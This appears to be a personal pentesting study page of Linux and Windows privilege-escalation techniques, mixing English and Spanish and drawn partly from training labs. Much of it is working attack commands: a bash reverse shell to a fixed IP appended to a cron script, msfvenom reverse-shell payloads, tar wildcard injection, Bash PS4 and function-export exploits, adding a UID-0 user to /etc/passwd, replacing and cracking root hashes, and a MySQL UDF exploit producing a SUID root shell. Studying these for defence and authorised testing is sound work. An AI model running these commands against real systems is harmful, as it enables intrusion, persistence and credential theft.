---
{"dg-publish":true,"permalink":"/notes/escalating-privileges-2/"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell***
[[Networking/netcat#Shell stabilization\|netcat#Shell stabilization#Technique 1 Python]]

### Get a bash
```shell
script /dev/null -c bash
```

### exec bash like a sudo
```shell
sudo -u root /bin/bash
```
## System enumeration - Manual
### [[Operative System/Linux/Commands/- Commands linux#! Get information\|- Commands linux#! Get information]]***
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm 4000 2>/dev/null`                                                                                                                       | search files [[Operative System/Linux/Permisos/SUID\|SUID]]                                  |
| `find -a`<br>`-a \( -perm -u+s -o -perm -g+s \)`                                                                                                              | Combine conditions [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



| Option                          | Description                                                                                   |
| ------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -a`                    | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au` | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                    | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                    | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                   | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -i`                    | Shows interface statistics.                                                                   |
| `netstat -ano`                  | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |


</div></div>

## System enumeration - Automated
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


</div></div>

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
### [[sudo Environment Variables\|sudo Environment Variables]]***
## SUID-SGID executables scaling
- https://gtfobins.github.io/
- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
Check files with SUID or SGID permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with SUID permision
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
Check files with SUID permision
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

|             |                      |
| ----------- | -------------------- |
| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Bash versions <4.2-048
- Define shell **functions** with **names** that **resemble** file paths
- - then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash <4.4
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Ver y cambiar capabilities
Como /usr está en modo lectura es necesario montarlo como escritura para poder editar las capabilities de este.
```shell
mount -o remount, rw /usr
setcap cap_net_admin,cap_net_raw+eip /usr/bin/wireshark
```

| Option                       | Description                          |
| ---------------------------- | ------------------------------------ |
| `getcap file`                | List capabilities simple             |
| `getcap -r / 2>/dev/null`    | List capabilities recursive from `/` |
| `setcap cap_setupid+ep file` | change                               |
| `setcap -r file`             | Remove                               |
## Lista de capabilities

Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementadas:

| Capability           | Description                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_SETUID           | Permite  manipulaciones arbitrarias de los IDs de usuario de los procesos (setuid(2), etc.); permite el uso  de  IDs  de  usuario falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                                        |
| CAP_SETGID           | Permite  manipulaciones arbitrarias de los IDs de grupo y de la lista de IDs de grupo adicionales de un proceso; permite el  uso de  IDs  de  grupo  falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                     |
| CAP_CHOWN            | Permite cambios arbitrarios en los IDs de usuario y de grupo de los ficheros (vea chown(2)).                                                                                                                                                                                                                                                                                                                                             |
| CAP_DAC_OVERRIDE     | Evita  las  comprobaciones de permisos sobre operaciones de lectura, escritura y ejecución.  (DAC = "control de acceso  discre-cional".)                                                                                                                                                                                                                                                                                                 |
| CAP_DAC_READ_SEARCH  | Evita comprobaciones de permisos sobre operaciones de lectura de ficheros y lectura y ejecución de directorios.                                                                                                                                                                                                                                                                                                                          |
| CAP_FOWNER           | Evita comprobaciones de permisos sobre operaciones  que  normalmente requieren que el ID de usuario del sistema de ficheros del proceso coincida  con  el  ID  de  usuario  del  fichero  (p.e., utime(2)),   excluyendo   aquellas   operaciones  cubiertas  por CAP_DAC_OVERRIDE y CAP_DAC_READ_SEARCH; ignora el  bit  pegajoso (sticky) en el borrado de ficheros.                                                                   |
| CAP_FSETID           | No  borra los bits set-user-ID y set-group-ID cuando se modifica un fichero; permite  establecer  el  bit  set-group-ID  para  un fichero  cuyo  ID  de  grupo  no  coincide con el del sistema de ficheros o cualquier otro ID  de  grupo  adicional  del  proceso invocador.                                                                                                                                                           |
| CAP_IPC_LOCK         | Permite  el  bloqueo  en  memoria  (mlock(2),  mlockall(2), shm-ctl(2)).                                                                                                                                                                                                                                                                                                                                                                 |
| CAP_IPC_OWNER        | Evita comprobaciones de  permisos  para  las  operaciones  sobre objetos System V IPC.                                                                                                                                                                                                                                                                                                                                                   |
| CAP_KILL             | Evita  comprobaciones  de  permisos  para  enviar  señales  (vea kill(2)).                                                                                                                                                                                                                                                                                                                                                               |
| CAP_LEASE            | (Linux 2.4 en adelante)  Permite que  se  establezcan  arriendos sobre ficheros arbitrarios (vea fcntl(2)).                                                                                                                                                                                                                                                                                                                              |
| CAP_LINUX_IMMUTABLE  | Permite  establecer  los  atributos  extendidos EXT2_APPEND_FL y EXT2_IMMUTABLE_FL sobre ficheros del sistema de ficheros ext2.                                                                                                                                                                                                                                                                                                          |
| CAP_MKNOD            | (Linux 2.4 en adelante) Permite la creación  de  ficheros  especiales usando mknod(2).                                                                                                                                                                                                                                                                                                                                                   |
| CAP_NET_ADMIN        | Permite   varias   operaciones  relacionadas  con  redes  (p.e., establecer opciones privilegiadas sobre conectores, habilitar la difusión  de paquetes multidestino (multicasting), configuración de interfaces, modificar tablas de encaminamiento).                                                                                                                                                                                   |
| CAP_NET_BIND_SERVICE | Permite ligar conectores a puertos  reservados  del  dominio  de Internet (números de puerto menores que 1024).                                                                                                                                                                                                                                                                                                                          |
| CAP_NET_BROADCAST    | (No  se  usa)  Permite  la  difusión universal (broadcasting) de paquetes a través de un conector y la escucha de paquetes multidestino.                                                                                                                                                                                                                                                                                                 |
| CAP_NET_RAW          | Permite el uso de conectores de tipo RAW y PACKET.                                                                                                                                                                                                                                                                                                                                                                                       |
| CAP_SETPCAP          | Concede o elimina cualquier capacidad en el conjunto de  capacidades permitidas del invocador a o desde cualquier otro proceso.                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_ADMIN        | Permite una variedad de operaciones de administración  del  sistema  incluyendo:  quotactl(2),  mount(2),  swapon(2),  sethostname(2), setdomainname(2), IPC_SET y operaciones IPC_RMID  sobre objetos  arbitrarios  IPC  de System V; permite el uso de IDs de usuario falsificados cuando se pasan credenciales de conectores.                                                                                                         |
| CAP_SYS_BOOT         | Permite llamadas a reboot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_CHROOT       | Permite llamadas a chroot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_MODULE       | Permite cargar y eliminar módulos del núcleo.                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_NICE         | Permite aumentar el valor nice del proceso  invocador  (nice(2), setpriority(2)) y cambiar el valor nice de procesos arbitrarios; permite establecer políticas de  planificación  de  tiempo  real para  el  proceso  invocador  y establecer políticas de planificación y prioridades para procesos arbitrarios  (sched_setscheduler(2), sched_setparam(2)).                                                                            |
| CAP_SYS_PACCT        | Permite llamadas a acct(2).                                                                                                                                                                                                                                                                                                                                                                                                              |
| CAP_SYS_PTRACE       | Permite  el seguimiento detallado de procesos arbitrarios usando ptrace(2)                                                                                                                                                                                                                                                                                                                                                               |
| CAP_SYS_RAWIO        | Permite operaciones sobre puertos de E/S (iopl(2) y ioperm(2)).                                                                                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_RESOURCE     | Permite el uso de espacio  reservado  en  sistemas  de  ficheros ext2;  llamadas  ioctl(2)  para  controlar  el registro en ext3; sobrescribir los límites de las cuotas de disco; incrementar los límites  de  recursos (vea setrlimit(2)); sobrescribir el límite del recurso RLIMIT_NPROC; incrementar el límite msg_qbytes para una  cola  de  mensajes  por encima del limite en /proc/sys/kernel/msgmnb (vea msgop(2) y msgctl(2). |
| CAP_SYS_TIME         | Permite la modificación del reloj del sistema  (settimeofday(2), adjtimex(2));  permite  la modificación del reloj de tiempo real (hardware)                                                                                                                                                                                                                                                                                             |
| CAP_SYS_TTY_CONFIG   | Permite llamadas a vhangup(2).                                                                                                                                                                                                                                                                                                                                                                                                           |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have [[Operative System/Linux/Permisos/SUID\|SUID]] binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example with `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we are imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

Check which folders can I write.

</div></div>

## Weak file permissions
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Create a new user
- write a new line entry create a new user!
- Add the password hash of our choice, and set the UID, GID and shell to root.

```shell
openssl passwd -1 -salt [salt] [password]
```

```
new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

```shell
echo 'new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Replace the hash of root
Generate password
```shell
openssl passwd [password]
```

Edit the `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row **(replacing the "x").**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Generate a new password hash with a password of your choice:
```shell
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

	su root

</div></div>

## Cron jobs exploiting
Look for jobs, and try to exploit them
```shell
/etc/crontab
/etc/cron.d
/etc/rc.d/
/etc/init.d
/var/spool/cron
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



check permissions of the scripts
and add a basic bash
```shell
echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- check the crontabs
- If a script exist with no direct path like
`* * * * * root overwrite.sh`
- We can check if we have permissions to create an imitate script in some dir of the PATH
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
- If it's possible, create a script and make exec,
- one options is make a copy of the root bash
```shell
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

- Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
	`/tmp/rootbash -p`


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check the scripts with tar, 7z, rsync, etc.
- Search a `*` like
```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- GTFOBins, Note that tar has command line options that let you **run** other **commands** as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
- Put it to `/home/user`
- Make it executable:
`chmod +x /home/user/shell.elf`
- Create these two files in /home/user:
Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
- Listen on attacker machine and wait for a cron run

</div></div>

## Writable scripts invoked by root

### Look for scripts with root permisions
```sh
find / -name *.sh 2>/dev/null | xargs ls -l
```

```shell
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

if a file is found, in temp create a script and exec the code
```sh
#!/bin/bash
	while true; do
		echo 'chmos u+s >> /tmpa.bash'
	done
```
## Passwords & keys
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check If a user accidentally types their password
```shell
history
```
```shell
cat ~/.*history | less
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Config files often contain passwords in plaintext or other reversible formats.
- Check what plaintext files is loading some files
```shell
ls /home/user
cat /home/user/myvpn.ovpn
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
- Search `.ssh` folder
- In this example, file called **root_key**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

```shell
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```shell
# Anything interesting the the mail?
/var/spool/mail
```

```shell
./LinEnum.sh -t -k password
```

</div></div>


## [[NFS#NFS exploitation\|NFS#NFS exploitation]]***

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- some third party software that might be vulnerable?. If you find anything google it for exploits.
```shell
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- service is running as root and the "root" user for the service does not have a password assigned
- take advantage of [[UDF\|UDF]] to run system commands as root via the MySQL service.
- https://www.exploit-db.com/exploits/1518
Compile
```shell
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect

	mysql -u root

Create a [[UDF\|UDF]] ) "do_system" using our compiled exploit:
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash   exit

</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
## chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Execute arbitrary commands:**

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Execute arbitrary commands:**

```
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._

## Zip

**Execute arbitrary commands:**

```
zip name.zip files -T --unzip-command "sh -c whoami"
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- It might be the user is running some service that is only available from that host.
- You **can't** connect to the service from the **outside**.
- It might be a development **server**, a **database**, or anything else.
- These services **might** be running as **root**, or they might have **vulnerabilities** in them.

Check the netstat and compare it with the nmap-scan you did from the outside.
```shell
# Linux
netstat -anlp
netstat -ano
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- looking for any unmounted filesystems.
- If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

</div></div>

## Kernel and distribution exploits
- Kernel exploits can leave the system in an **unstable state**
- Only run them as a **last resort.**
- Try search on https://www.linuxkernelcves.com/cves
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>

### [[Hacking Ético y Pentesting/DirtyCow\|DirtyCow]]

# Windows privesc

## System enumeration
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://github.com/peass-ng/PEASS-ng/releases
winpeas x64
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```powershell
..\PowerUp.ps1
Invoke-AllChecks
```

</div></div>

## Service problems
### CanRestart and writable
- IF an service is Canrestart True and writeable.
- The Path is
  `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- We can replace the legitimate application with our malicious one
- restart the service, which will run our infected program!
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- En los sistemas operativos Windows, cuando se inicia un servicio, el sistema intenta encontrar la ubicación del archivo ejecutable para lanzar el ataque.
- La ruta del ejecutable va entre comillas '"', para que el sistema pueda localizar fácilmente el binario de la aplicación.
- Los atacantes aprovechan los servicios con rutas no entrecomilladas que se ejecutan bajo privilegios de SISTEMA para elevar sus privilegios
- 

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
- Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Replace the DLL by a malicious

![Pasted_image_20230909115418.png](/img/user/attachments/Pasted_image_20230909115418.png)
## Exploit know vulnerabilities

Tools
	Robber
	PowerSploit


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



OSX
	Dylib hijadt
		Scanner to detect vuln
	Tool to make thje hijack
		OyUbhijack

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Spectre y Meltdown son vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e
Intel.

Vulnerabilidad Spectre
	Los atacantes pueden aprovechar esta vulnerabilidad para leer ubicaciones de memoria adyacentes de un proceso y acceder a información para la que no está autorizado.
	Usando esta vulnerabilidad, un atacante puede incluso leer la memoria del kernel o realizar un ataque basado en la web usando JavaScript.

Vulnerabilidad Meltdown
	Los atacantes pueden aprovecharse de esta vulnerabilidad para escalar privilegios forzando a un proceso sin privilegios a leer otras ubicaciones de memoria adyacentes como la memoria del kernel y la memoria física.
	Esto lleva a revelar información critica del sistema como credenciales, claves privadas, etc.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- In windows
- En el sistema operativo Windows, Named Pipe con nombre proporcionan una comunicación legítima entre los sistemas en ejecución.
- Los atacantes a menudo explotan esta técnica para escalar privilegios en el sistema de la víctima a los de una cuenta de usuario que tiene mayores privilegios de acceso.
